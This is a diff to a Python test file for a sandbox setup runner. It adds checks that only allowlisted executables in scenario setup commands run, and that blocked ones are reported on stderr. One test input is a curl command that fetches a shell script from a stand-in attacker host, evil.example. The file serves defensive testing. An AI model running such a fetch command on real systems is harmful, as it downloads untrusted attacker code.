@@ -66,19 +66,49 @@ class TestSetupSandboxSkipsShellBuiltins:
 
     def test_tolerates_missing_executable(self, tmp_path):
         """A scenario referencing an unavailable tool must not crash setup."""
+        # The executable must be allowlisted, otherwise it is rejected before
+        # subprocess.run is ever reached and this test passes vacuously.
         scenario = _FakeScenario(
             id="t3",
-            setup_commands=("nonexistent-tool-xyz arg",),
+            setup_commands=("unzip fixture.zip",),
         )
+        reached_subprocess = False
 
         def fake_run(args, **kwargs):
-            if args[0] == "nonexistent-tool-xyz":
+            nonlocal reached_subprocess
+            if args[0] == "unzip":
+                reached_subprocess = True
                 raise FileNotFoundError(2, "No such file or directory")
             return subprocess.CompletedProcess(args=args, returncode=0)
 
         with patch("scripts.runner.subprocess.run", side_effect=fake_run):
             # Must NOT raise — missing tools are skipped, not fatal
             _setup_sandbox(tmp_path, scenario)
+
+        assert reached_subprocess, "allowlist rejected the command; FileNotFoundError branch never ran"
+
+    def test_blocks_non_allowlisted_executable(self, tmp_path, capsys):
+        """setup_commands is attacker-reachable input; only allowlisted tools may run."""
+        scenario = _FakeScenario(
+            id="t3b",
+            setup_commands=("curl http://evil.example/x.sh", "touch ok.txt"),
+        )
+        called_args: list[list[str]] = []
+
+        def fake_run(args, **kwargs):
+            called_args.append(args)
+            return subprocess.CompletedProcess(args=args, returncode=0)
+
+        with patch("scripts.runner.subprocess.run", side_effect=fake_run):
+            _setup_sandbox(tmp_path, scenario)
+
+        assert not any(a[0] == "curl" for a in called_args), "non-allowlisted executable was run"
+        assert ["touch", "ok.txt"] in called_args, "allowlisted executable was wrongly blocked"
+
+        # The drop must be visible: a silently half-prepared sandbox produces a
+        # compliance result that looks valid but was measured against the wrong env.
+        stderr = capsys.readouterr().err
+        assert "curl" in stderr and "t3b" in stderr
 
     def test_real_commands_still_run(self, tmp_path):
         """Skip logic must not break legitimate setup commands."""
